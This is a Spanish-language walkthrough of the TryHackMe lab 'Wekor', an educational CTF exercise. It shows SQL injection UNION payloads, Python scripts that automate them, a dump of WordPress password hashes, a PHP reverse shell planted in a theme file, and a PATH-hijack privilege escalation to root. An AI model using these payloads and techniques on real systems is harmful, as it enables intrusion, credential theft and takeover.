---
title:  "Wekor Writeup [ES] - TryHackMe"
date:   2021-06-06 12:00:00 -0400
categories: [THM]
toc: true
comments: false
tags: [wordpress, sqli, web]
---

Wekor es un room de **TryHackMe** de dificultad media en donde se repasan conceptos de SQLi y Path Hijacking. Involucra explotación de WordPress, Virtual Hosting y una buena cantidad de enumeración.

Durante este post se estará realizando un paso a paso de como rootearla.

## Información

| Nombre             |   Dificultad  | S.O.| Autor |
|--------------------|-----|---|---|
| [wekor](https://www.tryhackme.com/room/wekorra) |  Media| Linux | [ustoun0](https://www.tryhackme.com/p/ustoun0) |

![Info](/images/THM/Wekor/01-machine-info.png)

> CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)


## Enumeración

### NMAP

Primero, se realiza un escaneo general de los 65535 puertos, y se exporta a formato grepeable.

* ```nmap -p- -sS --min-rate 5000 -n -v -oG nmap/allPorts.gnmap 10.10.201.142```

```plaintext
Nmap scan report for 10.10.201.142
Host is up (0.31s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
```

Nos reporta sólo dos puertos abiertos: **22,80**. Con esta información, realizamos un escaner más detallado de los servicios y versiones bajo esos puertos.

* ```nmap -sC -sV -p22,80 -oN nmap/ports.nmap 10.10.201.142```


```plaintext
Nmap scan report for 10.10.201.142
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
|_  256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 9 disallowed entries
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```

Nmap reporta que en la web se encuentra el archivo robots.txt, enumerando los directorios:

```
/workshop/
/root/
/lol/
/agent/
/feed
/crawler
/boot
/comingreallysoon
/interesting
```

### Enumeración Web

Se procede a enumerar el servicio web. Utilizando whatweb y wafw00f.

* ```whatweb http://10.10.201.142```

```bash
http://10.10.201.142 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.201.142]
```

* ```wafw00f http://10.10.201.142```

![wafw00f](/images/THM/Wekor/15-waf.png)


* ```robots.txt```

![robots.txt](/images/THM/Wekor/10-robots.png)

Ahora bien, lo siguiente será verificar si los directorios son válidos. Para esto se puede realizar una revisión manual o hacerlo mediante gobuster/wfuzz con un pequeño diccionario.

![wfuzz](/images/THM/Wekor/20-directories.png)

* ```wfuzz -c -L -w directories.txt -u http://10.10.201.142/FUZZ```

![wfuzz](/images/THM/Wekor/25-wfuzz-1.png)

En este caso, solo el directorio ```/comingreallysoon``` se encuentra disponible.

* http://10.10.201.142/comingreallysoon

![commingreallysoon](/images/THM/Wekor/30-coming.png)

> Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !

En este directorio se encuentra un texto que nos indica que el nuevo website se encuentra en **it-next**, abriendo esa ruta veremos lo siguiente:

* http://10.10.201.142/it-next/

![WordPress](/images/THM/Wekor/35-wordpress-page.png)

Dentro de esta ruta se visualiza un sitio web de lo que parece ser un servicio técnico o tienda IT. Para este caso en particular lo que se puede hacer es realizar un reconocimiento manual o ejecutar una herramienta automatizada para verificar si existe alguna vulnerabilidad o mala configuración que se puede aprovechar. En mi caso utilizaré [OWASP ZAP](https://www.zaproxy.org/).

![ZAP 1](/images/THM/Wekor/40-zap-1.png)

![ZAP 2](/images/THM/Wekor/45-zap-2.png)

ZAP reporta que existe un recurso en la URL ```http://10.10.201.142/it-next/it_cart.php``` que es vulnerable a SQL Injection. Al revisar en la página web, se visualiza un input para ingresar un cupón de descuento.

* Payload: ```' order by 5-- -```
  
![SQLi](/images/THM/Wekor/50-sqli-1.png)


Al intentar una inyección SQL básica, nos encontramos con el error

> Unknown column '5' in 'order clause'

Lo que nos indica que es un **SQLi Error based**

### SQLi

Realizando posteriores inyecciones, se descubre que la tabla consultada posee 3 columnas, ya que al realizar un ordenamiento por la tercera columna, el error SQL desaparece.

* Payload: ```' order by 3-- -```

![SQLi](/images/THM/Wekor/52-sqli-2.png)

Lo siguiente será identificar como se tramita esta información. Haciendo uso de las herramientas de navegador de Chrome se descubre lo siguiente:

![Form-data](/images/THM/Wekor/51-form-data.png)

La información se envía a través de POST a la URL http://10.10.201.142/it-next/it_cart.php. Enviándo los parámetros:

```shell
Form Data = {
            'coupon_code': '' order by 5-- -',
            'apply_coupon': 'Apply Coupon'
        }
```

Para trabajar más comodo, he escrito un pequeño script en Python que automatizará el envío del payload vía POST y reportará por consola el resultado. Este **script** estará disponible en la sección de recursos al final del post.

![SQLi](/images/THM/Wekor/55-sqli-3.png)

Continuando con el SQLI, lo siguiente sería enumerar la base de datos actual.

* Payload: ```' UNION SELECT database(),2,3-- -```

![SQLi](/images/THM/Wekor/57-sqli-database.png)

Posteriormente, enumeramos la(s) tabla(s) de la base de datos actual **coupons**.

* Payload: ```' UNION SELECT table_name,2,3 from information_schema.tables where table_schema="coupons" limit 0,1-- -```

![SQLi](/images/THM/Wekor/60-sqli-tables.png)

Como se observa en la imagen, utilizo ```limit 0,1``` y ```limit 1,1``` para iterar entre las distintas tablas que pudiera contener la base de datos, que en este caso solo contiene la tabla ```valid_coupons```.

A continuación, la idea sería enumerar las columnas de la tabla anteriormente mencionada.

* Payload: ```' UNION SELECT column_name,2,3 from information_schema.columns where table_schema="coupons" and table_name="valid_coupons" limit 0,1-- -```

![SQLi](/images/THM/Wekor/66-sqli-columns.png)

Con esta información, ya sabemos la estructura de la base de datos actual.

![SQLi](/images/THM/Wekor/68-sqli-structure.png)

Por último, se puede extraer la información contenida dentro de las columnas, y visualizamos lo siguiente:

* Payload: ```' UNION SELECT id,coupon,expire_date from valid_coupons limit 0,1-- -```

![SQLi](/images/THM/Wekor/70-sqli-data.png)

Ahora bien, sabiendo que es posible extraer data mediante el SQLi, lo siguiente será consultar bases de datos distintas a la de cupones. Para ello, podemos realizar.

![SQLi](/images/THM/Wekor/75-sqli-all-databases.png)

| Databases          | 
|--------------------|
| information_schema |
| coupons            |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |

Se obtienen las bases de datos listadas arriba, de las cuales, llama la atención la wordpress, ya que podríamos extraer información de login de los usuarios del CMS.

Para esta etapa he creado otro script para listar las tablas contenidas en la base de datos **wordpress**. 

![Wordpress tables](/images/THM/Wekor/78-wordpress-tables.png)

Tendríamos la siguiente estructura de datos:

![Wordpress diagram](/images/THM/Wekor/79-wordpress-diagram.png)

La información que nos interesa está en la tabla ```wp_users```.


* Payload: ```' UNION SELECT group_concat(user_login,0x3a,user_pass),2,3 from wordpress.wp_users-- -```

![SQLi](/images/THM/Wekor/80-sqli-wp-users.png)

```plaintext
admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10
wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
```
Con estos usuarios y hashes, lo siguiente es intentar crackear con la herramienta ```john```.


* ```john --wordlist=/usr/share/wordlists/rockyou.txt hash```

![SQLi](/images/THM/Wekor/85-hashes.png)

Ya con esta información, deberemos encontrar el panel de login de wordpress. 

Asumiendo que esta máquina sigue la estructura de TryHackMe, es posible que el vhost sea ```wekor.thm```. Con ello, podemos proceder a hacer un fuzzing de otros posibles subdominios. Se agrega este registro a ```/etc/hosts``` y posteriormente el escaneo con Gobuster.

* ```gobuster vhost -u http://wekor.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt```

![Vhost](/images/THM/Wekor/90-vhost-enumeration.png)

Se obtiene el subdominio ```site.wekor.thm``` en donde se visualiza un sitio con un mensaje en texto plano.

![Site](/images/THM/Wekor/92-site.wekor.thm.png)

Se realiza un nuevo fuzzing sobre esta ruta, esta vez de directorios.

* ```wfuzz -c --hc=404 --hh=143 -u http://site.wekor.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100```

![Fuzzing](/images/THM/Wekor/91-dir-enumeration.png)

Y se identifica el sitio web.

![Site](/images/THM/Wekor/95-wordpress.png)


## Ganando acceso


El sitio de login: http://site.wekor.thm/wordpress/wp-admin

Probando las credenciales obtenidas anteriormente, identificamos que el user **wp_yura** tiene permisos de administración del sitio. Ya una vez dentro, se realiza el reemplazo de uno de los archivos php por una reverse shell que nos permita acceder al sistema.

Para la shell estaré usando el recurso de [Pentest monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) e insertaré el código en el template de 404.php. Para esto hay que dirigirse a ***Appearance > Theme Editor***.

Una vez realizado, lo siguiente será abrir el canal para la escucha de la conexión y paralelamente consultar el recurso con la shell.

![Netcat](/images/THM/Wekor/100-netcat.png)

Ya solo restaría aplicar un tratamiento de la tty.

## Escalando privilegios

Como el usuario **www-data**, realizando un reconocimiento se detecta el servicio memcached corriendo por el puerto 11211.

* ```ps faux```
  
![Memcached](/images/THM/Wekor/103-memcached.png)

![Memcached-2](/images/THM/Wekor/105-memcached-password.png)

Esto nos proporciona credenciales válidas para el usuario **Orka**.

Ya como el usuario Orka, haciendo una enumeración, vemos que tenemos permisos para ejecutar un binario como el usuario *root*

![Sudo -l](/images/THM/Wekor/110-sudo-orka.png)

Al ejecutar el binario bitcoin, nos aparece lo siguiente:

![bitcoin](/images/THM/Wekor/115-bitcoin.png)

Utilizando ```ltrace``` podemos identificar que el binario realiza un ```strcmp()``` del input del usuario contra la palabra **password**.

![bitcoin](/images/THM/Wekor/120-bitcoin-2.png)

Intentando nuevamente, el binario nos toma la contraseña como válida y continúa la ejecución del código. Más adelante se puede ver que se llama a python de forma relativa para ejecutar el script transfer.py que se encuentra alojado en el escritorio del usuario Orka.

![bitcoin](/images/THM/Wekor/125-bitcoin-3.png)

![Desktop](/images/THM/Wekor/130-desktop.png)

En este punto, y con la información recabada. Es común pensar en un **path hijacking** para suplantar el binario de python con un script propio.

En este caso en particular, el grupo **Orka** tiene permisos de escritura en el directorio ```/usr/sbin```. Por lo tanto, lo que haré será alojar el script **python** ahí y ejecutar el binario ```bitcoin``` como **root**.

* Código:
  
```bash
#!/bin/bash
/bin/bash
```

![Permissions](/images/THM/Wekor/138-perms.png)

De esta forma, al correr nuevamente el binario ```bitcoin```, el script consultará nuestro "python" y nos otorgará una shell como el usuario **root**.

![root](/images/THM/Wekor/140-root.png)

Con esto concluye este room, lo último sería ingresar las flags en la plataforma.

## Recursos

### Script SQLi

Python script para explotar SQLi de la url: ```http://10.10.201.142/it-next/it_cart.php```.

```python
#!/usr/bin/python3
#coding: utf-8

import re
import sys
import signal
import requests
from termcolor import colored, cprint

sqli_url = "http://10.10.201.142/it-next/it_cart.php"

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

#CTRL + C
signal.signal(signal.SIGINT, def_handler)


def make_request(sqli):
    try:
        sqli_data = {
            'coupon_code': sqli,
            'apply_coupon': 'Apply Coupon'
        }

        r = requests.post(sqli_url, data=sqli_data)

        response = re.findall(r'<div align="center"><tr><td style="width:200px">(.*?)</div>', r.text)[0]
        cprint("\n\t[+] " + response, 'white')
    except Exception as e:
        print(str(e))


if __name__ == '__main__':
    while True:
        sqli = input("\n[?] Enter sqli: ").strip('\n')
        make_request(sqli)

```


### Enum-wordpress-tables

```python
#!/usr/bin/python3
#coding: utf-8

import re
import sys
import signal
import requests

sqli_url = "http://10.10.201.142/it-next/it_cart.php"

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

#CTRL + C
signal.signal(signal.SIGINT, def_handler)


def make_request():
    try:
        print("\n[!] Tables:\n")
        for number in range (0,12):
            payload = "' UNION SELECT table_name, 2,3 from information_schema.tables where table_schema='wordpress' limit {},1-- -".format(number)
            sqli_data = {
                'coupon_code': payload,
                'apply_coupon': 'Apply Coupon'
            }

            r = requests.post(sqli_url, data=sqli_data)

            response = re.findall(r'<div align="center"><tr><td style="width:200px">Coupon Code : </td>(.*?) With ID', r.text)[0]
            print("\t[+] "+ response)
    except Exception as e:
        print(str(e))


if __name__ == '__main__':
        make_request()
```